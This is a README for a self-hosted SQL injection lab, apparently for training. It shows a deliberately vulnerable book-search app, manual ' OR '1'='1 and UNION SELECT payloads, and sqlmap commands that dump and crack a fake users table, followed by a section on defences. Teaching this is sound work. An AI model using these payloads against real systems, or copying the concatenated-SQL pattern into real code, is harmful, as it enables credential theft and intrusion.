# SQL injection lab: from a book search to a dumped password table

A small, self-contained lab that demonstrates **SQL injection (SQLi)** end to end — the
vulnerability class that has topped the OWASP Top 10 and CWE Top 25 danger lists for two decades.
It ships one deliberately vulnerable web app and drives the industry-standard tool **sqlmap**
against it, so you can watch a harmless-looking "search for a book" feature turn into "read the
entire user-credentials table."

Everything runs on your own machine against a target this lab builds — an authorized, legal
learning environment, the same idea as picoCTF or HackTheBox, just self-hosted. Every command and
block of output below is from a real run; the raw logs are in [`output/`](output/).

---

## 0. What SQL injection is, in one paragraph

A web app turns your input into a database query. If it builds that query by **gluing your input
straight into the SQL text** (string concatenation) instead of using a *parameterized* query, then
input that contains SQL syntax changes the meaning of the query. An attacker types SQL where the
app expected a search term, and the database executes it. That lets them bypass logic (`' OR '1'='1`
makes a `WHERE` clause always true), read tables they were never meant to see (UNION a secret table
into the results), or, on some setups, write files and run commands.

This lab's vulnerable line is exactly that mistake — see it in
[`services/shop-app/server.py`](services/shop-app/server.py):

```python
# THE VULNERABILITY: user input concatenated directly into SQL.
sql = ("SELECT id, name, author, price FROM products "
       "WHERE name LIKE '%" + q + "%' OR author LIKE '%" + q + "%'")
```

The fix is one line — a parameterized query (`... LIKE ? ...` with `q` passed separately) — covered
in §5.

---

## 1. The lab target

One service, **BookNook**, a "book search" web app on host port **8899**, backed by an in-process
SQLite database (pure Python standard library — nothing to install, no external DB to run). The
database is seeded with two tables:

| Table | Contents | Meant to be visible? |
|---|---|---|
| `products` | 5 books (the search feature queries this) | ✅ yes — it's a public catalogue |
| `users` | 4 accounts with **md5 password hashes** + roles | ❌ no — the UI never exposes it |

The whole point: an attacker who can *only* search for books can, through the injection, reach the
`users` table they were never given access to.

**Confirm the normal behaviour first:**

```
$ curl "http://localhost:8899/search?q=clean"
<ul><li>#2 <b>Clean Code</b> by Robert Martin — $34.5</li></ul>
```

One search term, one matching book. Now the injection.

---

## 2. The vulnerability, by hand (understand it before automating)

**Probe 1 — make the WHERE clause always true** (`' OR '1'='1`). A search that should match nothing
suddenly returns the *entire* catalogue:

```
$ curl "http://localhost:8899/search?q=' OR '1'='1"
<ul>
  <li>#1 The Pragmatic Programmer ...</li>
  <li>#2 Clean Code ...</li>
  <li>#3 The Web Application Hacker's Handbook ...</li>
  <li>#4 Designing Data-Intensive Applications ...</li>
  <li>#5 Practical Malware Analysis ...</li>
</ul>
```

That behaviour difference (1 row vs. all rows) is the proof the input is being executed as SQL.

**Probe 2 — UNION the secret table into the results.** The query returns 4 columns
(id, name, author, price), so a `UNION SELECT` of 4 columns from `users` renders the credentials
right into the "book list" — username in the title slot, hash in the author slot, role in the price
slot ([`output/manual_union_oneliner.txt`](output/manual_union_oneliner.txt)):

```
$ curl "http://localhost:8899/search?q=zzz' UNION SELECT id,username,password_md5,role FROM users-- -"
<ul>
  <li>#1 <b>admin</b>    by 5f4dcc3b5aa765d61d8327deb882cf99 — $admin</li>
  <li>#2 <b>jsmith</b>   by e10adc3949ba59abbe56e057f20f883e — $editor</li>
  <li>#3 <b>svc_sync</b> by 827ccb0eea8a706c4c34a16891f84e7b — $service</li>
  <li>#4 <b>guest</b>    by d8578edf8458ce06fbc5bb76a58c5ca4 — $readonly</li>
</ul>
```

That single request is the whole vulnerability: a book-search endpoint just handed over every user's
password hash.

---

## 3. The same attack with sqlmap (the industry-standard tool)

By hand you have to know the column count and craft the UNION. **[sqlmap](https://sqlmap.org)**
automates all of it: it fingerprints the injection, figures out the technique and column count, maps
the schema, and dumps tables — even auto-cracking common password hashes. Run it with
[`exploit/run_sqlmap.sh`](exploit/run_sqlmap.sh), or directly:

**Step 1 — detect the injection + list the tables** ([`output/sqlmap_detect_tables.txt`](output/sqlmap_detect_tables.txt)):

```
$ sqlmap -u "http://localhost:8899/search?q=clean" --batch --dbms=sqlite --technique=BEU --tables

[*] GET parameter 'q' is 'Generic UNION query (NULL) - 4 columns' injectable
    Payload: q=clean' UNION ALL SELECT NULL,NULL,NULL,CHAR(...)-- -
[*] the back-end DBMS is SQLite
[2 tables]
+----------+
| products |
| users     |   <- sqlmap found the table the UI never exposes
+----------+
```

**Step 2 — dump `users`; sqlmap auto-cracks the md5 hashes** ([`output/sqlmap_dump_users.txt`](output/sqlmap_dump_users.txt)):

```
$ sqlmap -u "http://localhost:8899/search?q=clean" --batch --dbms=sqlite -T users --dump

Table: users
[4 entries]
+----+----------+----------+---------------------------------------------+
| id | role     | username | password_md5                                |
+----+----------+----------+---------------------------------------------+
| 1  | admin    | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| 2  | editor   | jsmith   | e10adc3949ba59abbe56e057f20f883e (123456)   |
| 3  | service  | svc_sync | 827ccb0eea8a706c4c34a16891f84e7b (12345)    |
| 4  | readonly | guest    | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty)   |
+----+----------+----------+---------------------------------------------+
```

The parenthesised plaintext (`password`, `123456`, …) is sqlmap cracking the weak md5 hashes against
its wordlist automatically — the same one-two punch (`dump hashes → crack them`) seen in real
breaches. The credentials here are fake and exist only in this lab.

`--dbms=sqlite` just tells sqlmap the backend so it skips other-database probes; the injection and
dumping techniques are HTTP-layer and work the same against MySQL/Postgres/MSSQL.

---

## 4. What each flag means

| Flag | Meaning |
|---|---|
| `-u "<url>"` | the target URL; the injectable parameter is the one in the query string (`q`) |
| `--batch` | don't ask questions, take the default answer (non-interactive) |
| `--dbms=sqlite` | tell sqlmap the backend so it skips irrelevant probes |
| `--technique=BEU` | which injection techniques to try — **B**oolean, **E**rror, **U**nion (skip slow time-based) |
| `--tables` | enumerate table names |
| `-T users --dump` | dump every row of the `users` table |

---

## 5. The defender's view (how to kill this)

- **The one real fix — parameterized queries.** Never concatenate input into SQL. The vulnerable
  line becomes: `cursor.execute("SELECT ... WHERE name LIKE ? OR author LIKE ?", (like, like))`,
  passing the value *separately* so the database treats it as data, never as SQL. This defeats every
  technique above at once.
- **Least privilege on the DB account.** The app's database user shouldn't be able to read a
  credentials table it never needs — and definitely shouldn't have file/command privileges.
- **Don't store passwords as md5.** Use a slow, salted password hash (bcrypt/argon2); the weak md5
  here is exactly why sqlmap cracked all four in seconds.
- **Don't leak raw DB errors** to users — verbose errors turn a blind injection into an easy
  error-based one.
- **Defense in depth:** a WAF and input validation raise the effort but are *not* a substitute for
  parameterized queries.

---

## 6. Going deeper: authoritative resources

- **PortSwigger Web Security Academy — SQL injection** (free interactive labs, the best starting point): https://portswigger.net/web-security/sql-injection
- **OWASP — SQL Injection**: https://owasp.org/www-community/attacks/SQL_Injection · **Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- **sqlmap** (official site + wiki): https://sqlmap.org · https://github.com/sqlmapproject/sqlmap/wiki
- **CWE-89: SQL Injection**: https://cwe.mitre.org/data/definitions/89.html
- **PayloadsAllTheThings — SQL Injection**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

---

## 7. Reproduce it

Run these from this lab's own directory (the one containing this README):

```bash
# 0. isolated network (if it doesn't exist yet)
docker network create cyberlab 2>/dev/null || true

# 1. start the vulnerable app (pure stdlib, no pip)
docker compose up -d

# 2. see it work by hand
curl "http://localhost:8899/search?q=clean"                 # normal: 1 book
curl "http://localhost:8899/search?q=' OR '1'='1"           # injection: all books

# 3. run sqlmap (needs sqlmap: `brew install sqlmap` or `apt install sqlmap`)
bash exploit/run_sqlmap.sh

# 4. tear down
docker compose down
```

**Environment:** developed on macOS + Docker Desktop (arm64; target image `python:3.11-slim`),
sqlmap 1.10.x. The [`output/`](output/) directory holds the real captured runs
(`sqlmap_detect_tables.txt`, `sqlmap_dump_users.txt`, `manual_union_oneliner.txt`).

**Boundary reminder:** sqlmap and these techniques may only be pointed at **a target you built
yourself** or an **authorized environment (picoCTF / HackTheBox / a client engagement with written
permission)**. Running them against systems you don't own or aren't authorized to test is a computer
crime in nearly every jurisdiction.
